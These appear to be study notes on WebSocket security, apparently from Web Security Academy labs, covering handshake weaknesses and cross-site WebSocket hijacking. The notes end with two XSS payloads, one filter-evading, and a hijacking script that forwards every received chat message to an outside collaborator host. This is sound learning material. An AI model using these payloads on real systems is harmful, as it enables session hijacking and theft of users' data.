

web sockets are basically tunnels of data created by the browser and server its purpose is to transmit data  they are initiated over http  


**what can we do in websocket:**

 -  check for handshake vulns

**Web socket vulns**:
	- User supplied input leading to vulns such  as sqli , XML ..
	- Blind vulns using out of band 
	- if the target transmits data to other apps this could potentially lead to XSS 


***todoFirst***:
- [ ] check for XSS
- [ ] check for handshake vulns
- [ ] check for any csrf tokens



**What are the handshake vulns**:
- Misplaced trust in HTTP headers to perform security decisions, such as the `X-Forwarded-For` header
- Flaws in session handling mechanisms
- attack surface introduced by custom HTTP headers used by the application



Cross-site  Websocket hijacking:

CSRF on a websocket  its noticeable when the handshake request  does not contain a CSRF token  if the attacker can create a malicious page and establish a cross site websocket connection to a vuln app the app will handle the connection in the context of the victim's session hence the attacker's site can send them arbitrary message to the server via connection and read the content of the message that are received back from the server  both ways 

- Impacts: 
	- unaut actions as the victim user
	- retrieve sensitive data sicne the attacker can interact 2 ways
	-just waiting for incoming messages to arrive containing sensitive data.

	
**first lab**:

payload: `<img src=1 onerror='alert(1)'>`


second-lab:\

`<img src=1 oNeRrOr=alert`1`>`


third-lab:
```
<script>
    var ws = new WebSocket('wss://0a96002103d2e10f80b94e3700da00bc.web-security-academy.net/chat ');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://srnz815zddxirxpa1lun1zyhe8kz8qwf.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```